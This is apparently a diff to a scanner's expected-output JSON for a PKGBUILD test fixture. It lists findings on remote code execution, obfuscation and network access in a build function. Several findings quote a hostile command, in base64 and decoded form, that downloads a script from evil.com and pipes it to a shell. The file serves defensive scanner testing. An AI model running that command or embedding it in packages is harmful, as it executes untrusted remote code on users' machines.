@@ -3,6 +3,24 @@
   "package_version": "1.0.0-1",
   "findings": [
     {
+      "id": "DLE-001",
+      "severity": "critical",
+      "category": "command_injection",
+      "title": "Curl pipe to shell",
+      "description": "Downloading and executing remote scripts is extremely dangerous. Used in 2018 xeactor attack.",
+      "location": {
+        "file": "tests/fixtures/malicious/obfuscated/PKGBUILD",
+        "line": 14,
+        "column": 5,
+        "snippet": "    echo \"Y3VybCBodHRwczovL2V2aWwuY29tL3NoZWxsLnNoIHwgYmFzaA==\" | base64 -d | sh    [resolved →     curl https://evil.com/shell.sh | bash | sh]"
+      },
+      "recommendation": "Download scripts first, review them, then execute",
+      "cwe_id": "CWE-94",
+      "metadata": {
+        "matched_text": "curl https://evil.com/shell.sh | bash | sh"
+      }
+    },
+    {
       "id": "DEEP-001",
       "severity": "critical",
       "category": "obfuscation",
@@ -21,21 +39,25 @@
       }
     },
     {
-      "id": "OBF-001",
-      "severity": "high",
-      "category": "obfuscation",
-      "title": "Base64 decoding",
-      "description": "Base64 decoding may hide malicious payloads",
+      "id": "EXEC-REMOTE",
+      "severity": "critical",
+      "category": "malicious_code",
+      "title": "Fetches and runs code from https://evil.com/shell.sh",
+      "description": "This package downloads and executes code from https://evil.com/shell.sh at build/install time. The scanner does NOT follow this reference (doing so could run the remote code), so what actually executes is unknown -- treat it as untrusted. The dependency tree/SBOM cannot account for code fetched at runtime.",
       "location": {
         "file": "tests/fixtures/malicious/obfuscated/PKGBUILD",
         "line": 14,
-        "column": 67,
-        "snippet": "    echo \"Y3VybCBodHRwczovL2V2aWwuY29tL3NoZWxsLnNoIHwgYmFzaA==\" | base64 -d | sh"
+        "column": null,
+        "snippet": "curl https://evil.com/shell.sh | bash | sh"
       },
-      "recommendation": "Decode and review the base64 content manually",
-      "cwe_id": "CWE-506",
+      "recommendation": "Do not build. A package that pulls and runs code from an external URL is opaque by design; obtain the software from a source that ships its real code.",
+      "cwe_id": "CWE-494",
       "metadata": {
-        "matched_text": "base64 -d"
+        "flow": "fetch-pipe",
+        "opaque_boundary": true,
+        "remote_urls": [
+          "https://evil.com/shell.sh"
+        ]
       }
     },
     {
@@ -75,6 +97,25 @@
       }
     },
     {
+      "id": "FUNC-001",
+      "severity": "high",
+      "category": "network_security",
+      "title": "Network access in build function",
+      "description": "Function 'build' contains network access command 'curl'",
+      "location": {
+        "file": "tests/fixtures/malicious/obfuscated/PKGBUILD",
+        "line": 12,
+        "column": null,
+        "snippet": null
+      },
+      "recommendation": "Network access should happen in source= array, not build functions",
+      "cwe_id": null,
+      "metadata": {
+        "function": "build",
+        "pattern": "curl"
+      }
+    },
+    {
       "id": "SRC-005",
       "severity": "medium",
       "category": "configuration",
@@ -94,6 +135,6 @@
   "scanned_files": [
     "tests/fixtures/malicious/obfuscated/PKGBUILD"
   ],
-  "timestamp": "2026-06-15T13:48:49.853682272Z",
-  "scan_duration_ms": 5
+  "timestamp": "2026-11-10T14:51:04.055300228Z",
+  "scan_duration_ms": 58
 }
